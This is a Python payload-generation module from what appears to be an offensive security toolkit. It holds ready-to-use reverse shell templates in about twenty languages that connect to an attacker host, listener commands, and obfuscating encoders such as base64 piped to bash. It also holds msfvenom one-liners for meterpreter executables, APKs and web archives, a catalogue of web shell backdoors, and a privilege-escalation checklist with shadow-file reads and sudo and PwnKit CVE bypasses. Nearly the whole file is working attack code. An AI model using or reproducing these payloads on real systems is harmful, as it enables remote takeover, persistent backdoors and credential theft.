"""Payload generation: reverse shells, msfvenom-style, encoders, listeners."""

import base64
import random
import shlex
import string

REVERSE_SHELLS = {
    "bash": "bash -i >& /dev/tcp/{host}/{port} 0>&1",
    "bash-196": "0<&196;exec 196<>/dev/tcp/{host}/{port}; sh <&196 >&196 2>&196",
    "bash-udp": "sh -i >& /dev/udp/{host}/{port} 0>&1",
    "sh": "sh -i >& /dev/tcp/{host}/{port} 0>&1",
    "nc": "nc -e /bin/sh {host} {port}",
    "nc-mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f",
    "ncat": "ncat {host} {port} -e /bin/bash",
    "socat": "socat TCP:{host}:{port} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
    "python": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{host}\",{port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'",
    "python-pty": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
    "perl": "perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'",
    "ruby": "ruby -rsocket -e 'f=TCPSocket.open(\"{host}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    "php": "php -r '$sock=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "powershell": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{host}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()\"",
    "powershell-b64": "powershell -e {b64}",
    "java": "Runtime r = Runtime.getRuntime(); Process p = r.exec(new String[]{{\"/bin/sh\",\"-c\",\"bash -i >& /dev/tcp/{host}/{port} 0>&1\"}}); p.waitFor();",
    "nodejs": "(function(){{var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var c=new net.Socket();c.connect({port},\"{host}\",function(){{c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);}});}})();",
    "lua": "lua5.1 -e 'local s=require(\"socket\");local t=s.tcp();t:connect(\"{host}\",{port});t:send(\"id\\n\");while true do local l=t:receive();if not l then break end;os.execute(l) end'",
    "awk": "awk 'BEGIN {{ s = \"/inet/tcp/0/{host}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") }} }}'",
    "golang": "echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{host}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go",
    "telnet": "TF=$(mktemp -u);mkfifo $TF && telnet {host} {port} 0<$TF | /bin/sh 1>$TF",
    "openssl": "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {host}:{port} > /tmp/s; rm /tmp/s",
}

LISTENERS = {
    "nc": "nc -lvnp {port}",
    "nc-nobuffering": "nc -lvnp {port} --no-buffer",
    "ncat-tls": "ncat --ssl -lvnp {port}",
    "socat-pty": "socat file:`tty`,raw,echo=0 TCP-LISTEN:{port},reuseaddr",
    "socat-tls": "socat openssl-listen:{port},cert=cert.pem,key=key.pem,verify=0 file:`tty`,raw,echo=0",
    "rlwrap": "rlwrap nc -lvnp {port}",
    "msf": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD {payload}; set LHOST 0.0.0.0; set LPORT {port}; run'",
}

ENCODERS = {
    "base64": lambda p: base64.b64encode(p.encode()).decode(),
    "base64-decode-bash": lambda p: "echo %s | base64 -d | bash" % base64.b64encode(p.encode()).decode(),
    "hex": lambda p: p.encode().hex(),
    "url": lambda p: "".join("%%%02x" % b for b in p.encode()),
    "powershell-utf16": lambda p: base64.b64encode(p.encode("utf-16-le")).decode(),
    "gzip-base64": lambda p: base64.b64encode(__import__("gzip").compress(p.encode())).decode(),
}

UPGRADE_TTY = [
    "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
    "Ctrl+Z  # background the shell",
    "stty raw -echo; fg",
    "export TERM=xterm-256color SHELL=/bin/bash",
    "stty rows <N> cols <M>   # read local size with: stty size",
]


def generate(shell, host, port):
    if shell not in REVERSE_SHELLS:
        raise KeyError(shell)
    template = REVERSE_SHELLS[shell]
    if "{b64}" in template:
        inner = REVERSE_SHELLS["powershell"].format(host=host, port=int(port))
        b64 = base64.b64encode(inner.encode("utf-16-le")).decode()
        return template.format(host=host, port=int(port), b64=b64)
    return template.format(host=host, port=int(port))


def generate_all(host, port):
    return {name: generate(name, host, port) for name in REVERSE_SHELLS}


def listener(name, port, payload="linux/x64/meterpreter/reverse_tcp"):
    if name not in LISTENERS:
        raise KeyError(name)
    return LISTENERS[name].format(port=int(port), payload=payload)


def encode(scheme, payload):
    if scheme not in ENCODERS:
        raise KeyError(scheme)
    return ENCODERS[scheme](payload)


def msfvenom_catalog(host, port):
    """Copy-paste msfvenom one-liners for common targets."""
    lhost, lport = host, int(port)
    return [
        ("Windows EXE (staged)", "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe -o shell.exe" % (lhost, lport)),
        ("Windows EXE (stageless)", "msfvenom -p windows/x64/meterpreter_reverse_https LHOST=%s LPORT=%s -f exe -o shell.exe" % (lhost, lport)),
        ("Windows DLL", "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f dll -o shell.dll" % (lhost, lport)),
        ("Windows shellcode", "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f c" % (lhost, lport)),
        ("Windows MSI", "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f msi -o shell.msi" % (lhost, lport)),
        ("Windows HTA", "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f hta-psh -o shell.hta" % (lhost, lport)),
        ("Windows PS1", "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f psh-reflection -o shell.ps1" % (lhost, lport)),
        ("Linux ELF", "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf -o shell.elf" % (lhost, lport)),
        ("Linux shellcode", "msfvenom -p linux/x64/shell_reverse_tcp LHOST=%s LPORT=%s -f c" % (lhost, lport)),
        ("macOS Mach-O", "msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f macho -o shell.macho" % (lhost, lport)),
        ("Android APK", "msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R -o shell.apk" % (lhost, lport)),
        ("PHP", "msfvenom -p php/meterpreter_reverse_tcp LHOST=%s LPORT=%s -f raw -o shell.php" % (lhost, lport)),
        ("JSP", "msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f raw -o shell.jsp" % (lhost, lport)),
        ("WAR", "msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f war -o shell.war" % (lhost, lport)),
        ("ASPX", "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f aspx -o shell.aspx" % (lhost, lport)),
        ("Python", "msfvenom -p python/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f raw -o shell.py" % (lhost, lport)),
        ("Encoded Windows EXE", "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -e x64/xor_dynamic -i 8 -f exe -o encoded.exe" % (lhost, lport)),
        ("Embedded in PNG", "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe -o payload.exe && msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -x /usr/share/windows-resources/binaries/plink.exe -k -f exe -o embedded.exe" % (lhost, lport, lhost, lport)),
    ]


def web_shell_catalog():
    return [
        ("PHP minimal", "<?php system($_GET['cmd']); ?>"),
        ("PHP passthru", "<?php passthru($_REQUEST['c']); ?>"),
        ("PHP stealth", "<?php $k='c';@eval(base64_decode($_POST[$k])); ?>"),
        ("PHP upload", "<?php if(isset($_FILES['f'])){move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['f']['name']);echo 'ok';} ?>"),
        ("JSP", "<%@ page import=\"java.util.*,java.io.*\"%><% Process p=Runtime.getRuntime().exec(request.getParameter(\"c\")); BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=br.readLine())!=null){out.println(l);} %>"),
        ("ASPX", "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process p=new System.Diagnostics.Process(); p.StartInfo.FileName=\"cmd.exe\"; p.StartInfo.Arguments=\"/c \"+Request[\"c\"]; p.StartInfo.UseShellExecute=false; p.StartInfo.RedirectStandardOutput=true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>"),
        ("NodeJS", "const http=require('http'),cp=require('child_process');http.createServer((q,s)=>{cp.exec(q.url.slice(2),(e,o)=>s.end(o||e?.message))}).listen(8080)"),
        ("Python Flask", "from flask import Flask,request;import subprocess;app=Flask(__name__)\n@app.route('/')\ndef x():return subprocess.run(request.args.get('c','id'),shell=True,capture_output=True).stdout\napp.run()"),
    ]


def privesc_checklist():
    return [
        ("sudo -l", "Kullanici hangi komutlari root ile calistirabiliyor"),
        ("find / -perm -4000 -type f 2>/dev/null", "SUID binary avi (GTFOBins hedefleri)"),
        ("getcap -r / 2>/dev/null", "Dosya yetenekleri (cap_setuid vb.)"),
        ("cat /etc/crontab; ls -la /etc/cron.*", "Zamanlanmis gorevler"),
        ("ps aux | grep -v '\\[' ", "Calisan servisler ve sahipleri"),
        ("ss -tulpn", "Dinlenen portlar"),
        ("cat /etc/passwd; cat /etc/shadow 2>/dev/null", "Kullanici listesi ve parola hashleri"),
        ("id; groups; whoami", "Mevcut kimlik ve gruplar"),
        ("ls -la /home /root /opt /srv /var/backups", "Yazilabilir/ilginc dizinler"),
        ("find / -writable -type d 2>/dev/null | head", "Yazilabilir dizinler"),
        ("cat /etc/os-release; uname -a", "Cekirdek surumu -> kernel exploit arama"),
        ("env; cat ~/.bash_history", "Ortam degiskenleri ve gecmis komutlar"),
        ("docker ps 2>/dev/null; ls -la /var/run/docker.sock", "Docker kacis vektoru"),
        ("sudo -u#-1 /bin/bash", "CVE-2019-14287 sudo bypass"),
        ("pkexec --version", "CVE-2021-4034 PwnKit kontrolu"),
    ]


def payload_names():
    return sorted(REVERSE_SHELLS)


def listener_names():
    return sorted(LISTENERS)


def encoder_names():
    return sorted(ENCODERS)
